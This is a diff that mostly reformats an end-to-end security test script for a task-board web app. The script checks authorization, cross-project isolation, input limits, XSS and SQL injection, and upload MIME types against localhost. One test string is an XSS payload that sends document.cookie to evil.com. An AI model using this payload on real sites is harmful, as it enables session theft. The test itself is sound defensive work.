@@ -7,6 +7,7 @@
  *
  * Run: npx tsx tests/e2e-security-tests.ts
  */
+export {};
 
 const BASE = 'http://localhost:4173';
 const ORIGIN_HEADER = { Origin: BASE };
@@ -90,7 +91,9 @@ async function registerUser(name: string, emailPrefix: string): Promise<string> 
 		}
 
 		if (!cookies.includes('session=')) {
-			throw new Error(`Failed to register user ${name}: no session cookie, status=${res.status}, body=${body.substring(0, 200)}`);
+			throw new Error(
+				`Failed to register user ${name}: no session cookie, status=${res.status}, body=${body.substring(0, 200)}`
+			);
 		}
 		return cookies;
 	}
@@ -98,7 +101,9 @@ async function registerUser(name: string, emailPrefix: string): Promise<string> 
 }
 
 /** Get the user profile for a session (with retry for rate limiting) */
-async function getMe(cookie: string): Promise<{ id: string; email: string; name: string; role: string }> {
+async function getMe(
+	cookie: string
+): Promise<{ id: string; email: string; name: string; role: string }> {
 	for (let attempt = 0; attempt < 3; attempt++) {
 		const res = await fetch(`${BASE}/api/v1/users/me`, { headers: { Cookie: cookie } });
 		if (res.ok) return res.json();
@@ -145,7 +150,10 @@ async function createProject(cookie: string, name: string): Promise<string> {
 			} catch {}
 		}
 		const match = location.match(/\/projects\/([^/]+)\/board/);
-		if (!match) throw new Error(`Failed to create project: status=${res.status}, body=${body.substring(0, 200)}`);
+		if (!match)
+			throw new Error(
+				`Failed to create project: status=${res.status}, body=${body.substring(0, 200)}`
+			);
 		return match[1];
 	}
 	throw new Error('Failed to create project after 3 retries (rate limited)');
@@ -303,9 +311,23 @@ async function testAuthorizationBypass() {
 	);
 	await res1.text();
 	if (res1.status === 403) {
-		record('AuthBypass', 'Access other user project tasks (should 403)', 'PASS', 'Correctly denied', dur1, res1.status);
+		record(
+			'AuthBypass',
+			'Access other user project tasks (should 403)',
+			'PASS',
+			'Correctly denied',
+			dur1,
+			res1.status
+		);
 	} else {
-		record('AuthBypass', 'Access other user project tasks (should 403)', 'FAIL', `Expected 403, got ${res1.status}`, dur1, res1.status);
+		record(
+			'AuthBypass',
+			'Access other user project tasks (should 403)',
+			'FAIL',
+			`Expected 403, got ${res1.status}`,
+			dur1,
+			res1.status
+		);
 	}
 
 	// 1b. Try updating a task in a project you don't belong to
@@ -327,9 +349,23 @@ async function testAuthorizationBypass() {
 		);
 		await res2.text();
 		if (res2.status === 403) {
-			record('AuthBypass', 'Update task in foreign project (should 403)', 'PASS', 'Correctly denied', dur2, res2.status);
+			record(
+				'AuthBypass',
+				'Update task in foreign project (should 403)',
+				'PASS',
+				'Correctly denied',
+				dur2,
+				res2.status
+			);
 		} else {
-			record('AuthBypass', 'Update task in foreign project (should 403)', 'FAIL', `Expected 403, got ${res2.status}`, dur2, res2.status);
+			record(
+				'AuthBypass',
+				'Update task in foreign project (should 403)',
+				'FAIL',
+				`Expected 403, got ${res2.status}`,
+				dur2,
+				res2.status
+			);
 		}
 
 		// 1c. Try deleting a task as a viewer (role check)
@@ -344,9 +380,23 @@ async function testAuthorizationBypass() {
 		);
 		await res3.text();
 		if (res3.status === 403) {
-			record('AuthBypass', 'Delete task as viewer (should 403)', 'PASS', 'Viewer correctly denied delete', dur3, res3.status);
+			record(
+				'AuthBypass',
+				'Delete task as viewer (should 403)',
+				'PASS',
+				'Viewer correctly denied delete',
+				dur3,
+				res3.status
+			);
 		} else {
-			record('AuthBypass', 'Delete task as viewer (should 403)', 'FAIL', `Expected 403, got ${res3.status}`, dur3, res3.status);
+			record(
+				'AuthBypass',
+				'Delete task as viewer (should 403)',
+				'FAIL',
+				`Expected 403, got ${res3.status}`,
+				dur3,
+				res3.status
+			);
 		}
 	}
 
@@ -358,9 +408,23 @@ async function testAuthorizationBypass() {
 	);
 	await res4.text();
 	if (res4.status === 401) {
-		record('AuthBypass', 'Access /api/v1/users/me with invalid session', 'PASS', '401 as expected', dur4, res4.status);
+		record(
+			'AuthBypass',
+			'Access /api/v1/users/me with invalid session',
+			'PASS',
+			'401 as expected',
+			dur4,
+			res4.status
+		);
 	} else {
-		record('AuthBypass', 'Access /api/v1/users/me with invalid session', 'FAIL', `Expected 401, got ${res4.status}`, dur4, res4.status);
+		record(
+			'AuthBypass',
+			'Access /api/v1/users/me with invalid session',
+			'FAIL',
+			`Expected 401, got ${res4.status}`,
+			dur4,
+			res4.status
+		);
 	}
 
 	// 1e. Try accessing /api/v1/users/me with empty session cookie
@@ -371,9 +435,23 @@ async function testAuthorizationBypass() {
 	);
 	await res4b.text();
 	if (res4b.status === 401) {
-		record('AuthBypass', 'Access /api/v1/users/me with empty session', 'PASS', '401 as expected', dur4b, res4b.status);
+		record(
+			'AuthBypass',
+			'Access /api/v1/users/me with empty session',
+			'PASS',
+			'401 as expected',
+			dur4b,
+			res4b.status
+		);
 	} else {
-		record('AuthBypass', 'Access /api/v1/users/me with empty session', 'FAIL', `Expected 401, got ${res4b.status}`, dur4b, res4b.status);
+		record(
+			'AuthBypass',
+			'Access /api/v1/users/me with empty session',
+			'FAIL',
+			`Expected 401, got ${res4b.status}`,
+			dur4b,
+			res4b.status
+		);
 	}
 
 	// 1f. Try creating a task in a project that doesn't exist
@@ -391,9 +469,23 @@ async function testAuthorizationBypass() {
 	await res5.text();
 	// Should fail with 403 (no project access) or 400 (invalid)
 	if (res5.status === 403 || res5.status === 400 || res5.status === 404) {
-		record('AuthBypass', 'Create task in nonexistent project', 'PASS', `Rejected with ${res5.status}`, dur5, res5.status);
+		record(
+			'AuthBypass',
+			'Create task in nonexistent project',
+			'PASS',
+			`Rejected with ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	} else {
-		record('AuthBypass', 'Create task in nonexistent project', 'FAIL', `Expected 403/400/404, got ${res5.status}`, dur5, res5.status);
+		record(
+			'AuthBypass',
+			'Create task in nonexistent project',
+			'FAIL',
+			`Expected 403/400/404, got ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	}
 }
 
@@ -412,7 +504,13 @@ async function testCrossProjectAccess() {
 	const [freshProjectB, durFresh] = await measure(() =>
 		createProject(userBCookie, 'Isolated Project B')
 	);
-	record('CrossProject', 'Create isolated Project B', 'PASS', `projectId=${freshProjectB}`, durFresh);
+	record(
+		'CrossProject',
+		'Create isolated Project B',
+		'PASS',
+		`projectId=${freshProjectB}`,
+		durFresh
+	);
 
 	const [res1, dur1] = await measure(() =>
 		fetch(`${BASE}/api/v1/tasks?projectId=${freshProjectB}`, {
@@ -421,9 +519,23 @@ async function testCrossProjectAccess() {
 	);
 	await res1.text();
 	if (res1.status === 403) {
-		record('CrossProject', 'User A lists tasks from isolated Project B (should 403)', 'PASS', 'Access denied', dur1, res1.status);
+		record(
+			'CrossProject',
+			'User A lists tasks from isolated Project B (should 403)',
+			'PASS',
+			'Access denied',
+			dur1,
+			res1.status
+		);
 	} else {
-		record('CrossProject', 'User A lists tasks from isolated Project B (should 403)', 'FAIL', `Expected 403, got ${res1.status}`, dur1, res1.status);
+		record(
+			'CrossProject',
+			'User A lists tasks from isolated Project B (should 403)',
+			'FAIL',
+			`Expected 403, got ${res1.status}`,
+			dur1,
+			res1.status
+		);
 	}
 
 	// 2b. User B tries to create task in Project A (should 403)
@@ -440,9 +552,23 @@ async function testCrossProjectAccess() {
 	);
 	await res2.text();
 	if (res2.status === 403) {
-		record('CrossProject', 'User B creates task in Project A (should 403)', 'PASS', 'Access denied', dur2, res2.status);
+		record(
+			'CrossProject',
+			'User B creates task in Project A (should 403)',
+			'PASS',
+			'Access denied',
+			dur2,
+			res2.status
+		);
 	} else {
-		record('CrossProject', 'User B creates task in Project A (should 403)', 'FAIL', `Expected 403, got ${res2.status}`, dur2, res2.status);
+		record(
+			'CrossProject',
+			'User B creates task in Project A (should 403)',
+			'FAIL',
+			`Expected 403, got ${res2.status}`,
+			dur2,
+			res2.status
+		);
 	}
 
 	// 2c. User B tries to update Project A settings (should fail)
@@ -464,11 +590,26 @@ async function testCrossProjectAccess() {
 	);
 	const body3 = await res3.text();
 	// Form actions via fetch return 200 with {type:"failure"} or actual 403
-	const isFailure3 = res3.status === 403 || body3.includes('"failure"') || body3.includes('Forbidden');
+	const isFailure3 =
+		res3.status === 403 || body3.includes('"failure"') || body3.includes('Forbidden');
 	if (isFailure3) {
-		record('CrossProject', 'User B updates Project A settings (should fail)', 'PASS', 'Settings update denied', dur3, res3.status);
+		record(
+			'CrossProject',
+			'User B updates Project A settings (should fail)',
+			'PASS',
+			'Settings update denied',
+			dur3,
+			res3.status
+		);
 	} else {
-		record('CrossProject', 'User B updates Project A settings (should fail)', 'FAIL', `Expected failure, got status=${res3.status}, body=${body3.substring(0, 200)}`, dur3, res3.status);
+		record(
+			'CrossProject',
+			'User B updates Project A settings (should fail)',
+			'FAIL',
+			`Expected failure, got status=${res3.status}, body=${body3.substring(0, 200)}`,
+			dur3,
+			res3.status
+		);
 	}
 
 	// 2d. User B tries to invite someone to Project A (should fail)
@@ -489,11 +630,26 @@ async function testCrossProjectAccess() {
 		})
 	);
 	const body4 = await res4.text();
-	const isFailure4 = res4.status === 403 || body4.includes('"failure"') || body4.includes('Forbidden');
+	const isFailure4 =
+		res4.status === 403 || body4.includes('"failure"') || body4.includes('Forbidden');
 	if (isFailure4) {
-		record('CrossProject', 'User B invites to Project A (should fail)', 'PASS', 'Invitation denied', dur4, res4.status);
+		record(
+			'CrossProject',
+			'User B invites to Project A (should fail)',
+			'PASS',
+			'Invitation denied',
+			dur4,
+			res4.status
+		);
 	} else {
-		record('CrossProject', 'User B invites to Project A (should fail)', 'FAIL', `Expected failure, got status=${res4.status}, body=${body4.substring(0, 200)}`, dur4, res4.status);
+		record(
+			'CrossProject',
+			'User B invites to Project A (should fail)',
+			'FAIL',
+			`Expected failure, got status=${res4.status}, body=${body4.substring(0, 200)}`,
+			dur4,
+			res4.status
+		);
 	}
 
 	// 2e. User A tries to create a label in isolated Project B (should 403)
@@ -506,9 +662,23 @@ async function testCrossProjectAccess() {
 	);
 	await res5.text();
 	if (res5.status === 403) {
-		record('CrossProject', 'User A creates label in isolated Project B (should 403)', 'PASS', 'Access denied', dur5, res5.status);
+		record(
+			'CrossProject',
+			'User A creates label in isolated Project B (should 403)',
+			'PASS',
+			'Access denied',
+			dur5,
+			res5.status
+		);
 	} else {
-		record('CrossProject', 'User A creates label in isolated Project B (should 403)', 'FAIL', `Expected 403, got ${res5.status}`, dur5, res5.status);
+		record(
+			'CrossProject',
+			'User A creates label in isolated Project B (should 403)',
+			'FAIL',
+			`Expected 403, got ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	}
 }
 
@@ -536,9 +706,23 @@ async function testBoundaryValues() {
 	);
 	const task1 = await res1.json();
 	if (res1.status === 201 && task1.title && task1.title.length === 500) {
-		record('Boundary', 'Create task with 500-char title (max allowed)', 'PASS', `Title stored: ${task1.title.length} chars`, dur1, res1.status);
+		record(
+			'Boundary',
+			'Create task with 500-char title (max allowed)',
+			'PASS',
+			`Title stored: ${task1.title.length} chars`,
+			dur1,
+			res1.status
+		);
 	} else {
-		record('Boundary', 'Create task with 500-char title (max allowed)', 'FAIL', `status=${res1.status}, title length=${task1.title?.length}`, dur1, res1.status);
+		record(
+			'Boundary',
+			'Create task with 500-char title (max allowed)',
+			'FAIL',
+			`status=${res1.status}, title length=${task1.title?.length}`,
+			dur1,
+			res1.status
+		);
 	}
 
 	// 3b. Create task with title that's 501 chars (should fail)
@@ -556,9 +740,23 @@ async function testBoundaryValues() {
 	);
 	await res2.text();
 	if (res2.status === 400) {
-		record('Boundary', 'Create task with 501-char title (should fail)', 'PASS', 'Correctly rejected', dur2, res2.status);
+		record(
+			'Boundary',
+			'Create task with 501-char title (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur2,
+			res2.status
+		);
 	} else {
-		record('Boundary', 'Create task with 501-char title (should fail)', 'FAIL', `Expected 400, got ${res2.status}`, dur2, res2.status);
+		record(
+			'Boundary',
+			'Create task with 501-char title (should fail)',
+			'FAIL',
+			`Expected 400, got ${res2.status}`,
+			dur2,
+			res2.status
+		);
 	}
 
 	// 3c. Create task with empty title (should fail)
@@ -575,15 +773,34 @@ async function testBoundaryValues() {
 	);
 	await res2b.text();
 	if (res2b.status === 400) {
-		record('Boundary', 'Create task with empty title (should fail)', 'PASS', 'Correctly rejected', dur2b, res2b.status);
+		record(
+			'Boundary',
+			'Create task with empty title (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur2b,
+			res2b.status
+		);
 	} else {
-		record('Boundary', 'Create task with empty title (should fail)', 'FAIL', `Expected 400, got ${res2b.status}`, dur2b, res2b.status);
+		record(
+			'Boundary',
+			'Create task with empty title (should fail)',
+			'FAIL',
+			`Expected 400, got ${res2b.status}`,
+			dur2b,
+			res2b.status
+		);
 	}
 
 	// 3d. Create a task for comment testing
 	let commentTestTaskId = '';
 	try {
-		const t = await createTask(userACookie, projectAId, projectAColumnId, 'Comment boundary test task');
+		const t = await createTask(
+			userACookie,
+			projectAId,
+			projectAColumnId,
+			'Comment boundary test task'
+		);
 		commentTestTaskId = t.id;
 	} catch (e: any) {
 		record('Boundary', 'Create task for comment tests', 'FAIL', e.message, 0);
@@ -601,9 +818,23 @@ async function testBoundaryValues() {
 		);
 		const comment3 = await res3.json();
 		if (res3.status === 201 && comment3.body && comment3.body.length === 10000) {
-			record('Boundary', 'Create comment with 10000-char body (max)', 'PASS', `Body stored: ${comment3.body.length} chars`, dur3, res3.status);
+			record(
+				'Boundary',
+				'Create comment with 10000-char body (max)',
+				'PASS',
+				`Body stored: ${comment3.body.length} chars`,
+				dur3,
+				res3.status
+			);
 		} else {
-			record('Boundary', 'Create comment with 10000-char body (max)', 'FAIL', `status=${res3.status}, body length=${comment3.body?.length}`, dur3, res3.status);
+			record(
+				'Boundary',
+				'Create comment with 10000-char body (max)',
+				'FAIL',
+				`status=${res3.status}, body length=${comment3.body?.length}`,
+				dur3,
+				res3.status
+			);
 		}
 
 		// 3f. Create comment with body > 10000 chars (should fail)
@@ -617,9 +848,23 @@ async function testBoundaryValues() {
 		);
 		await res4.text();
 		if (res4.status === 400) {
-			record('Boundary', 'Create comment with 10001-char body (should fail)', 'PASS', 'Correctly rejected', dur4, res4.status);
+			record(
+				'Boundary',
+				'Create comment with 10001-char body (should fail)',
+				'PASS',
+				'Correctly rejected',
+				dur4,
+				res4.status
+			);
 		} else {
-			record('Boundary', 'Create comment with 10001-char body (should fail)', 'FAIL', `Expected 400, got ${res4.status}`, dur4, res4.status);
+			record(
+				'Boundary',
+				'Create comment with 10001-char body (should fail)',
+				'FAIL',
+				`Expected 400, got ${res4.status}`,
+				dur4,
+				res4.status
+			);
 		}
 
 		// 3g. Create comment with empty body (should fail)
@@ -632,9 +877,23 @@ async function testBoundaryValues() {
 		);
 		await res4b.text();
 		if (res4b.status === 400) {
-			record('Boundary', 'Create comment with empty body (should fail)', 'PASS', 'Correctly rejected', dur4b, res4b.status);
+			record(
+				'Boundary',
+				'Create comment with empty body (should fail)',
+				'PASS',
+				'Correctly rejected',
+				dur4b,
+				res4b.status
+			);
 		} else {
-			record('Boundary', 'Create comment with empty body (should fail)', 'FAIL', `Expected 400, got ${res4b.status}`, dur4b, res4b.status);
+			record(
+				'Boundary',
+				'Create comment with empty body (should fail)',
+				'FAIL',
+				`Expected 400, got ${res4b.status}`,
+				dur4b,
+				res4b.status
+			);
 		}
 	}
 
@@ -648,9 +907,23 @@ async function testBoundaryValues() {
 	);
 	await res5.text();
 	if (res5.status === 400) {
-		record('Boundary', 'Create label with empty name (should fail)', 'PASS', 'Correctly rejected', dur5, res5.status);
+		record(
+			'Boundary',
+			'Create label with empty name (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur5,
+			res5.status
+		);
 	} else {
-		record('Boundary', 'Create label with empty name (should fail)', 'FAIL', `Expected 400, got ${res5.status}`, dur5, res5.status);
+		record(
+			'Boundary',
+			'Create label with empty name (should fail)',
+			'FAIL',
+			`Expected 400, got ${res5.status}`,
+			dur5,
+			res5.status
+		);
 	}
 
 	// 3i. Create label with name exceeding max (50 chars)
@@ -664,9 +937,23 @@ async function testBoundaryValues() {
 	);
 	await res5b.text();
 	if (res5b.status === 400) {
-		record('Boundary', 'Create label with 51-char name (should fail)', 'PASS', 'Correctly rejected', dur5b, res5b.status);
+		record(
+			'Boundary',
+			'Create label with 51-char name (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur5b,
+			res5b.status
+		);
 	} else {
-		record('Boundary', 'Create label with 51-char name (should fail)', 'FAIL', `Expected 400, got ${res5b.status}`, dur5b, res5b.status);
+		record(
+			'Boundary',
+			'Create label with 51-char name (should fail)',
+			'FAIL',
+			`Expected 400, got ${res5b.status}`,
+			dur5b,
+			res5b.status
+		);
 	}
 
 	// 3j. Create task with invalid priority value (should fail)
@@ -684,9 +971,23 @@ async function testBoundaryValues() {
 	);
 	await res6.text();
 	if (res6.status === 400) {
-		record('Boundary', 'Create task with invalid priority (should fail)', 'PASS', 'Correctly rejected', dur6, res6.status);
+		record(
+			'Boundary',
+			'Create task with invalid priority (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur6,
+			res6.status
+		);
 	} else {
-		record('Boundary', 'Create task with invalid priority (should fail)', 'FAIL', `Expected 400, got ${res6.status}`, dur6, res6.status);
+		record(
+			'Boundary',
+			'Create task with invalid priority (should fail)',
+			'FAIL',
+			`Expected 400, got ${res6.status}`,
+			dur6,
+			res6.status
+		);
 	}
 
 	// 3k. Update task with invalid status value (should fail)
@@ -700,9 +1001,23 @@ async function testBoundaryValues() {
 		);
 		await res7.text();
 		if (res7.status === 400) {
-			record('Boundary', 'Update task with invalid status (should fail)', 'PASS', 'Correctly rejected', dur7, res7.status);
+			record(
+				'Boundary',
+				'Update task with invalid status (should fail)',
+				'PASS',
+				'Correctly rejected',
+				dur7,
+				res7.status
+			);
 		} else {
-			record('Boundary', 'Update task with invalid status (should fail)', 'FAIL', `Expected 400, got ${res7.status}`, dur7, res7.status);
+			record(
+				'Boundary',
+				'Update task with invalid status (should fail)',
+				'FAIL',
+				`Expected 400, got ${res7.status}`,
+				dur7,
+				res7.status
+			);
 		}
 	}
 
@@ -721,9 +1036,23 @@ async function testBoundaryValues() {
 	);
 	await res8.text();
 	if (res8.status === 400) {
-		record('Boundary', 'Create task with negative storyPoints (should fail)', 'PASS', 'Correctly rejected', dur8, res8.status);
+		record(
+			'Boundary',
+			'Create task with negative storyPoints (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur8,
+			res8.status
+		);
 	} else {
-		record('Boundary', 'Create task with negative storyPoints (should fail)', 'FAIL', `Expected 400, got ${res8.status}`, dur8, res8.status);
+		record(
+			'Boundary',
+			'Create task with negative storyPoints (should fail)',
+			'FAIL',
+			`Expected 400, got ${res8.status}`,
+			dur8,
+			res8.status
+		);
 	}
 
 	// 3m. Create task with negative estimateMinutes (should fail)
@@ -741,9 +1070,23 @@ async function testBoundaryValues() {
 	);
 	await res9.text();
 	if (res9.status === 400) {
-		record('Boundary', 'Create task with negative estimateMinutes (should fail)', 'PASS', 'Correctly rejected', dur9, res9.status);
+		record(
+			'Boundary',
+			'Create task with negative estimateMinutes (should fail)',
+			'PASS',
+			'Correctly rejected',
+			dur9,
+			res9.status
+		);
 	} else {
-		record('Boundary', 'Create task with negative estimateMinutes (should fail)', 'FAIL', `Expected 400, got ${res9.status}`, dur9, res9.status);
+		record(
+			'Boundary',
+			'Create task with negative estimateMinutes (should fail)',
+			'FAIL',
+			`Expected 400, got ${res9.status}`,
+			dur9,
+			res9.status
+		);
 	}
 }
 
@@ -771,11 +1114,32 @@ async function testXssInjection() {
 	);
 	const xssTask = await res1.json();
 	if (res1.status === 201 && xssTask.title === xssTitle) {
-		record('XSS', 'Create task with <script> in title', 'PASS', `Stored as-is: "${xssTask.title}" (not executed, safely stored)`, dur1, res1.status);
+		record(
+			'XSS',
+			'Create task with <script> in title',
+			'PASS',
+			`Stored as-is: "${xssTask.title}" (not executed, safely stored)`,
+			dur1,
+			res1.status
+		);
 	} else if (res1.status === 201) {
-		record('XSS', 'Create task with <script> in title', 'PASS', `Stored (possibly sanitized): "${xssTask.title}"`, dur1, res1.status);
+		record(
+			'XSS',
+			'Create task with <script> in title',
+			'PASS',
+			`Stored (possibly sanitized): "${xssTask.title}"`,
+			dur1,
+			res1.status
+		);
 	} else {
-		record('XSS', 'Create task with <script> in title', 'FAIL', `status=${res1.status}`, dur1, res1.status);
+		record(
+			'XSS',
+			'Create task with <script> in title',
+			'FAIL',
+			`status=${res1.status}`,
+			dur1,
+			res1.status
+		);
 	}
 
 	// 4b. Verify the XSS payload is returned safely via API (not executed in context)
@@ -787,9 +1151,23 @@ async function testXssInjection() {
 		);
 		const retrieved = await res1b.json();
 		if (res1b.ok && retrieved.title === xssTitle) {
-			record('XSS', 'Retrieve XSS task via API (stored as-is)', 'PASS', `Title returned as plain text: "${retrieved.title}"`, dur1b, res1b.status);
+			record(
+				'XSS',
+				'Retrieve XSS task via API (stored as-is)',
+				'PASS',
+				`Title returned as plain text: "${retrieved.title}"`,
+				dur1b,
+				res1b.status
+			);
 		} else {
-			record('XSS', 'Retrieve XSS task via API (stored as-is)', 'FAIL', `Retrieved title: "${retrieved.title}"`, dur1b, res1b.status);
+			record(
+				'XSS',
+				'Retrieve XSS task via API (stored as-is)',
+				'FAIL',
+				`Retrieved title: "${retrieved.title}"`,
+				dur1b,
+				res1b.status
+			);
 		}
 	}
 
@@ -815,9 +1193,23 @@ async function testXssInjection() {
 		);
 		const xssResult = await resXss.json();
 		if (resXss.status === 201) {
-			record('XSS', `XSS payload in title: ${payload.substring(0, 30)}...`, 'PASS', `Stored safely, title="${xssResult.title?.substring(0, 50)}"`, durXss, resXss.status);
+			record(
+				'XSS',
+				`XSS payload in title: ${payload.substring(0, 30)}...`,
+				'PASS',
+				`Stored safely, title="${xssResult.title?.substring(0, 50)}"`,
+				durXss,
+				resXss.status
+			);
 		} else {
-			record('XSS', `XSS payload in title: ${payload.substring(0, 30)}...`, 'PASS', `Rejected (also safe): status=${resXss.status}`, durXss, resXss.status);
+			record(
+				'XSS',
+				`XSS payload in title: ${payload.substring(0, 30)}...`,
+				'PASS',
+				`Rejected (also safe): status=${resXss.status}`,
+				durXss,
+				resXss.status
+			);
 		}
 	}
 
@@ -829,7 +1221,8 @@ async function testXssInjection() {
 	} catch {}
 
 	if (xssCommentTaskId) {
-		const xssBody = '<script>document.cookie</script><img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">';
+		const xssBody =
+			'<script>document.cookie</script><img src=x onerror="fetch(\'http://evil.com/\'+document.cookie)">';
 		const [res2, dur2] = await measure(() =>
 			fetch(`${BASE}/api/v1/comments`, {
 				method: 'POST',
@@ -839,11 +1232,32 @@ async function testXssInjection() {
 		);
 		const xssComment = await res2.json();
 		if (res2.status === 201 && xssComment.body === xssBody) {
-			record('XSS', 'Create comment with XSS payload in body', 'PASS', 'Stored as-is (safe for API return, frontend must escape)', dur2, res2.status);
+			record(
+				'XSS',
+				'Create comment with XSS payload in body',
+				'PASS',
+				'Stored as-is (safe for API return, frontend must escape)',
+				dur2,
+				res2.status
+			);
 		} else if (res2.status === 201) {
-			record('XSS', 'Create comment with XSS payload in body', 'PASS', `Stored (possibly sanitized): body length=${xssComment.body?.length}`, dur2, res2.status);
+			record(
+				'XSS',
+				'Create comment with XSS payload in body',
+				'PASS',
+				`Stored (possibly sanitized): body length=${xssComment.body?.length}`,
+				dur2,
+				res2.status
+			);
 		} else {
-			record('XSS', 'Create comment with XSS payload in body', 'FAIL', `status=${res2.status}`, dur2, res2.status);
+			record(
+				'XSS',
+				'Create comment with XSS payload in body',
+				'FAIL',
+				`status=${res2.status}`,
+				dur2,
+				res2.status
+			);
 		}
 	}
 
@@ -875,7 +1289,14 @@ async function testXssInjection() {
 	}
 	const injMatch = injectionProjectLocation.match(/\/projects\/([^/]+)\/board/);
 	if (injMatch) {
-		record('XSS', 'Create project with SQL injection name', 'PASS', `Project created safely (parameterized queries), id=${injMatch[1]}`, dur3, res3.status);
+		record(
+			'XSS',
+			'Create project with SQL injection name',
+			'PASS',
+			`Project created safely (parameterized queries), id=${injMatch[1]}`,
+			dur3,
+			res3.status
+		);
 
 		// Verify the users table still exists
 		try {
@@ -885,12 +1306,30 @@ async function testXssInjection() {
 			const count = result.rows[0].cnt as number;
 			client.close();
 			if (count > 0) {
-				record('XSS', 'Verify users table intact after SQL injection', 'PASS', `users table has ${count} rows`, 0);
+				record(
+					'XSS',
+					'Verify users table intact after SQL injection',
+					'PASS',
+					`users table has ${count} rows`,
+					0
+				);
 			} else {
-				record('XSS', 'Verify users table intact after SQL injection', 'FAIL', 'users table appears empty', 0);
+				record(
+					'XSS',
+					'Verify users table intact after SQL injection',
+					'FAIL',
+					'users table appears empty',
+					0
+				);
 			}
 		} catch (e: any) {
-			record('XSS', 'Verify users table intact after SQL injection', 'FAIL', `DB error: ${e.message}`, 0);
+			record(
+				'XSS',
+				'Verify users table intact after SQL injection',
+				'FAIL',
+				`DB error: ${e.message}`,
+				0
+			);
 		}
 
 		// Verify the project name was stored literally
@@ -906,14 +1345,27 @@ async function testXssInjection() {
 			if (storedName === sqlInjectionName) {
 				record('XSS', 'SQL injection name stored literally', 'PASS', `name="${storedName}"`, 0);
 			} else {
-				record('XSS', 'SQL injection name stored literally', 'FAIL', `Expected "${sqlInjectionName}", got "${storedName}"`, 0);
+				record(
+					'XSS',
+					'SQL injection name stored literally',
+					'FAIL',
+					`Expected "${sqlInjectionName}", got "${storedName}"`,
+					0
+				);
 			}
 		} catch (e: any) {
 			record('XSS', 'SQL injection name stored literally', 'FAIL', `DB error: ${e.message}`, 0);
 		}
 	} else {
 		// Even rejection is acceptable for SQL injection
-		record('XSS', 'Create project with SQL injection name', 'PASS', `Rejected or handled safely: status=${res3.status}`, dur3, res3.status);
+		record(
+			'XSS',
+			'Create project with SQL injection name',
+			'PASS',
+			`Rejected or handled safely: status=${res3.status}`,
+			dur3,
+			res3.status
+		);
 	}
 }
 
@@ -951,9 +1403,23 @@ async function testMimeTypeAllowlist() {
 	);
 	await res1.text();
 	if (res1.status === 400) {
-		record('MIME', 'Upload with application/x-executable (should 400)', 'PASS', 'Correctly rejected', dur1, res1.status);
+		record(
+			'MIME',
+			'Upload with application/x-executable (should 400)',
+			'PASS',
+			'Correctly rejected',
+			dur1,
+			res1.status
+		);
 	} else {
-		record('MIME', 'Upload with application/x-executable (should 400)', 'FAIL', `Expected 400, got ${res1.status}`, dur1, res1.status);
+		record(
+			'MIME',
+			'Upload with application/x-executable (should 400)',
+			'FAIL',
+			`Expected 400, got ${res1.status}`,
+			dur1,
+			res1.status
+		);
 	}
 
 	// 5b. Try to upload with disallowed MIME type: text/html
@@ -971,9 +1437,23 @@ async function testMimeTypeAllowlist() {
 	);
 	await res2.text();
 	if (res2.status === 400) {
-		record('MIME', 'Upload with text/html (should 400)', 'PASS', 'Correctly rejected', dur2, res2.status);
+		record(
+			'MIME',
+			'Upload with text/html (should 400)',
+			'PASS',
+			'Correctly rejected',
+			dur2,
+			res2.status
+		);
 	} else {
-		record('MIME', 'Upload with text/html (should 400)', 'FAIL', `Expected 400, got ${res2.status}`, dur2, res2.status);
+		record(
+			'MIME',
+			'Upload with text/html (should 400)',
+			'FAIL',
+			`Expected 400, got ${res2.status}`,
+			dur2,
+			res2.status
+		);
 	}
 
 	// 5c. Try to upload with disallowed MIME type: application/x-sh
@@ -991,9 +1471,23 @@ async function testMimeTypeAllowlist() {
 	);
 	await res2b.text();
 	if (res2b.status === 400) {
-		record('MIME', 'Upload with application/x-sh (should 400)', 'PASS', 'Correctly rejected', dur2b, res2b.status);
+		record(
+			'MIME',
+			'Upload with application/x-sh (should 400)',
+			'PASS',
+			'Correctly rejected',
+			dur2b,
+			res2b.status
+		);
 	} else {
-		record('MIME', 'Upload with application/x-sh (should 400)', 'FAIL', `Expected 400, got ${res2b.status}`, dur2b, res2b.status);
+		record(
+			'MIME',
+			'Upload with application/x-sh (should 400)',
+			'FAIL',
+			`Expected 400, got ${res2b.status}`,
+			dur2b,
+			res2b.status
+		);
 	}
 
 	// 5d. Try to upload with allowed MIME type: image/png
@@ -1012,13 +1506,34 @@ async function testMimeTypeAllowlist() {
 	// Should succeed (201) or fail with 500 if no S3 configured
 	if (res3.status === 201) {
 		const body = await res3.json();
-		record('MIME', 'Upload with image/png (should work)', 'PASS', `Presigned URL generated, attachment id=${body.attachment?.id}`, dur3, res3.status);
+		record(
+			'MIME',
+			'Upload with image/png (should work)',
+			'PASS',
+			`Presigned URL generated, attachment id=${body.attachment?.id}`,
+			dur3,
+			res3.status
+		);
 	} else if (res3.status === 500) {
 		await res3.text();
-		record('MIME', 'Upload with image/png (should work or 500 if no S3)', 'PASS', '500 expected when S3 not configured (MIME check passed)', dur3, res3.status);
+		record(
+			'MIME',
+			'Upload with image/png (should work or 500 if no S3)',
+			'PASS',
+			'500 expected when S3 not configured (MIME check passed)',
+			dur3,
+			res3.status
+		);
 	} else {
 		await res3.text();
-		record('MIME', 'Upload with image/png (should work)', 'FAIL', `Expected 201 or 500, got ${res3.status}`, dur3, res3.status);
+		record(
+			'MIME',
+			'Upload with image/png (should work)',
+			'FAIL',
+			`Expected 201 or 500, got ${res3.status}`,
+			dur3,
+			res3.status
+		);
 	}
 
 	// 5e. Try to upload with allowed MIME type: application/pdf
@@ -1036,10 +1551,24 @@ async function testMimeTypeAllowlist() {
 	);
 	if (res4.status === 201 || res4.status === 500) {
 		await res4.text();
-		record('MIME', 'Upload with application/pdf (should work or 500)', 'PASS', `Status ${res4.status} (MIME check passed)`, dur4, res4.status);
+		record(
+			'MIME',
+			'Upload with application/pdf (should work or 500)',
+			'PASS',
+			`Status ${res4.status} (MIME check passed)`,
+			dur4,
+			res4.status
+		);
